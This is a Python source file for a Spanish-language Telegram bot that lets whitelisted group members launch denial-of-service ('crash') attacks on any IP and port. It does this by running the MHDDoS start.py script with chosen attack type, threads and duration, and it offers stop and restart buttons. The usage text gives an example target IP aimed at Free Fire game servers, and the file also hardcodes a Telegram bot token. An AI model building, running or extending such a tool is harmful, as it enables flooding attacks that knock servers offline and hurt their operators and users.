# -*- coding: utf-8 -*-
import telebot
import subprocess
import json
import os
import time
from threading import Lock, Thread, Timer
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7234938721:AAH6Z7qJWB744uCfIShF2tVDit7sGiDcNXM"
ADMIN_ID = 6958414459
GROUP_LINK = "https://t.me/crashgrupo"  # Reemplaza con el enlace de tu grupo
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}
spam_cooldowns = {}  # Diccionario para rastrear el tiempo de silencio por spam

# Rutas de archivos JSON
groups_file = "groups.json"
users_file = "users.json"

# Verifica si el archivo de grupos existe, si no, lo crea
if not os.path.exists(groups_file):
    with open(groups_file, "w") as f:
        json.dump({"groups": []}, f)

# Verifica si el archivo de usuarios existe, si no, lo crea
if not os.path.exists(users_file):
    with open(users_file, "w") as f:
        json.dump({"users": []}, f)

# Guardar tiempo de inicio del bot
start_time = time.time()

def load_groups():
    """Carga los grupos desde el archivo JSON"""
    with open(groups_file, "r") as f:
        data = json.load(f)
    return data["groups"]

def save_groups(groups):
    """Guarda los grupos en el archivo JSON"""
    with open(groups_file, "w") as f:
        json.dump({"groups": groups}, f)

def load_users():
    """Carga la lista de usuarios desde el archivo JSON."""
    with open(users_file, "r") as f:
        return json.load(f)["users"]

def save_users(users):
    """Guarda la lista de usuarios en el archivo JSON."""
    with open(users_file, "w") as f:
        json.dump({"users": users}, f)

def add_user(user_id):
    """Agrega un usuario a la lista si no está registrado."""
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)

def is_allowed(message):
    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
    groups = load_groups()
    if message.chat.id in groups or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
        return True
    bot.reply_to(message, f"❌ *¡Este bot solo funciona en los grupos autorizados!*\n🔗 Únete a nuestro grupo de *Free Fire* aquí: {GROUP_LINK}")
    return False

def check_shutdown_time():
    """Verifica el tiempo restante y notifica a los grupos cuando falten 5 minutos."""
    while True:
        elapsed_time = time.time() - start_time
        remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos

        if remaining_time <= 300:  # 5 minutos en segundos
            groups = load_groups()
            for group_id in groups:
                try:
                    bot.send_message(
                        group_id,
                        "⚠️ *Aviso Importante:*\n\n"
                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
                        "¡Gracias por su comprensión! 🙏",
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

            # Esperar a que el bot se apague
            time.sleep(300)  # Esperar 5 minutos
            break

        time.sleep(60)  # Verificar cada minuto

def notify_groups_bot_started():
    """Notifica a los grupos que el bot ha sido encendido."""
    groups = load_groups()
    for group_id in groups:
        try:
            bot.send_message(
                group_id,
                "✅ *¡online!*\n\n"
                "Ya puedes seguir utilizando todos los comandos disponibles.\n\n"
                "¡Gracias por su paciencia! 🌟",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

@bot.message_handler(commands=["start"])
def handle_start(message):
    add_user(message.chat.id)  # Asegura que el usuario quede registrado

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton("💻 *SOPORTE - OFICIAL* 💻", url=f"tg://user?id={ADMIN_ID}")
    markup.add(button)

    bot.send_message(
        message.chat.id,
        "🎮 *¡Bienvenido!* 🚀\n\n"
        "🔧 Usa `/help` para ver los comandos disponibles.",
        reply_markup=markup,
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    # Verificar cooldown
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!* 🚫\n\n"
                "📌 *Uso correcto:*\n"
                "`/crash <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
                "💡 *Ejemplo de uso:*\n"
                "`/crash UDP 143.92.125.230:10013 1 480`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = int(args[3])  # Convertir a entero
    duration = int(args[4])  # Convertir a entero

    # Validar límites
    if threads > 3:
        bot.reply_to(message, "❌ *El número máximo de hilos permitido es 3.*")
        return

    if duration > 600:
        bot.reply_to(message, "❌ *La duración máxima permitida es de 600 segundos (10 minutos).*")
        return

    command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()
        cooldowns[f"last_command_{telegram_id}"] = message.text  # Guardar el último comando

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔴 Parar Ataque 🔴", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*🔥 ¡Ataque Iniciado! 🔥*\n\n"
                f"📍 *IP:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Hilos:* {threads}\n"
                f"⏳ *Duración:* {duration} segundos\n\n"
                "*creado por garena*🎇"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al iniciar el ataque:* {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede pararlo.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        try:
            bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
            
            # Crear botón para realizar el ataque nuevamente
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Realizar ataque nuevamente", callback_data=f"restart_attack_{telegram_id}"))

            bot.edit_message_text(
                "*[🔵] *ATAQUE PARADO* [🔵]*\n\n"
                "¿Quieres realizar el ataque nuevamente? Tienes **20 segundos** para decidir.",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )

            # Programar la eliminación del mensaje después de 20 segundos
            Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
        except Exception as e:
            print(f"Error al responder a la consulta de callback o editar el mensaje: {str(e)}")
    else:
        try:
            bot.answer_callback_query(call.id, "❌ *No hay ataque activo para detener.*")
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")

def delete_message(chat_id, message_id):
    """Elimina el mensaje después de 20 segundos."""
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        print(f"Error al eliminar el mensaje: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
def handle_restart_attack(call):
    telegram_id = int(call.data.split("_")[2])  # Extraer el ID del usuario que inició el ataque

    if call.from_user.id != telegram_id:  # Verificar si el usuario que presionó el botón es el mismo que inició el ataque
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede repetirlo.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    # Verificar si el usuario está silenciado por spam
    if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
        bot.answer_callback_query(
            call.id, "❌ *Has hecho demasiadas solicitudes. Espera 1 minuto antes de intentar de nuevo.*"
        )
        return

    # Verificar si el tiempo de espera para reiniciar el ataque ha expirado
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        # Obtener el último comando de ataque del usuario
        last_command = cooldowns.get(f"last_command_{telegram_id}")
        if not last_command:
            try:
                bot.answer_callback_query(call.id, "❌ *No hay un ataque previo para repetir.*")
            except Exception as e:
                print(f"Error al responder a la consulta de callback: {str(e)}")
            return

        # Ejecutar el último comando de ataque
        try:
            args = last_command.split()
            attack_type = args[1]
            ip_port = args[2]
            threads = int(args[3])  # Convertir a entero
            duration = int(args[4])  # Convertir a entero

            # Validar límites
            if threads > 1:
                bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 1.*")
                return

            if duration > 480:
                bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 480 segundos (8 minutos).*")
                return

            command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[telegram_id] = process
            cooldowns[telegram_id] = time.time()  # Actualizar el cooldown

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔴 Parar Ataque 🔴", callback_data=f"stop_{telegram_id}"))

            bot.edit_message_text(
                "*🔥 ¡Ataque Reiniciado! 🔥*\n\n"
                f"📍 *IP:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Hilos:* {threads}\n"
                f"⏳ *Duración:* {duration} segundos\n\n"
                "*creado por garena* 🎇",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )
            bot.answer_callback_query(call.id, "✅ *Ataque reiniciado con éxito.*")
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")

        # Silenciar al usuario si hace spam
        if telegram_id in spam_cooldowns:
            spam_cooldowns[telegram_id] = time.time()
        else:
            spam_cooldowns[telegram_id] = time.time()
    else:
        bot.answer_callback_query(call.id, "❌ *El tiempo para reiniciar el ataque ha expirado.*")

@bot.message_handler(commands=["addgroup"])
def handle_addgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede agregar grupos.*")
        return

    try:
        # Obtener ID del grupo
        group_id = int(message.text.split()[1])
        groups = load_groups()

        # Verificar si el grupo ya está en la lista
        if group_id in groups:
            bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
            return

        # Agregar el grupo y guardar
        groups.append(group_id)
        save_groups(groups)

        bot.reply_to(message, f"✅ *Grupo {group_id} agregado correctamente.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["removegroup"])
def handle_removegroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede eliminar el bot de los grupos.*")
        return

    if message.chat.type != "private":
        bot.reply_to(message, "❌ *Este comando solo puede usarse en privado.*")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        # Verificar si el grupo está en la lista
        if group_id not in groups:
            bot.reply_to(message, "❌ *Este grupo no está en la lista.*")
            return

        # Eliminar el grupo y guardar
        groups.remove(group_id)
        save_groups(groups)

        # El bot abandona el grupo
        bot.leave_chat(group_id)

        bot.reply_to(message, f"✅ *Bot eliminado correctamente del grupo {group_id}.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["listgroups"])
def handle_listgroups(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede ver la lista de grupos.*")
        return

    groups = load_groups()
    if not groups:
        bot.reply_to(message, "❌ *No hay grupos autorizados.*")
        return

    groups_list = "\n".join([f"📍 *Grupo ID:* {group_id}" for group_id in groups])
    bot.reply_to(
        message,
        f"📋 *Grupos autorizados:*\n{groups_list}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
def handle_help(message):
    if not is_allowed(message):
        return

    bot.send_message(
        message.chat.id,
        (
            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
            "Este bot está diseñado para ayudarte a ejecutar.\n\n"
            "*Comandos disponibles:*\n"
            "1. `/start`: Inicia el bot y te da una breve introducción.\n"
            "2. `/crash <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia un ataque de crash.\n"
            "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
            "4. `/removegroup <ID del grupo>`: Elimina un grupo de la lista de grupos permitidos (solo admin).\n"
            "5. `/help`: Muestra esta ayuda.\n"
            "6. `/timeactive`: Muestra el tiempo activo del bot y el tiempo restante antes de que se cierre.\n"
            "7. `/broadcast <mensaje>`: Envía un mensaje a todos los usuarios registrados (solo admin).\n"
            "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n\n"
            "¡Juega con responsabilidad y diviértete! 🎮"
        ),
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["timeactive"])
def handle_timeactive(message):
    if not is_allowed(message):
        return

    elapsed_time = time.time() - start_time
    remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos

    elapsed_minutes = int(elapsed_time // 60)
    elapsed_seconds = int(elapsed_time % 60)

    remaining_minutes = int(remaining_time // 60)
    remaining_seconds = int(remaining_time % 60)

    bot.reply_to(
        message,
        (
            f"🕒 *Tiempo activo del bot:*\n"
            f"✅ *Tiempo transcurrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
            f"⚠️ *Tiempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
            "🚀 *Recuerda que Codespaces se cierra automáticamente después de 140 minutos.*"
        ),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcast.*")
        return

    users = load_users()
    success_count, fail_count = 0, 0

    for user_id in users:
        try:
            bot.send_message(user_id, f"📢  {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje a {user_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} usuarios. ❌ Falló en {fail_count}.")

@bot.message_handler(commands=["broadcastgroup"])
def handle_broadcastgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcastgroup", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcastgroup.*")
        return

    groups = load_groups()
    success_count, fail_count = 0, 0

    for group_id in groups:
        try:
            bot.send_message(group_id, f"📢 *Mensaje del admin:* {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} grupos. ❌ Falló en {fail_count}.")

if __name__ == "__main__":
    # Notificar a los grupos que el bot ha sido encendido
    notify_groups_bot_started()

    # Iniciar el hilo para verificar el tiempo de apagado
    shutdown_thread = Thread(target=check_shutdown_time)
    shutdown_thread.daemon = True
    shutdown_thread.start()

    # Iniciar el bot
    bot.infinity_polling()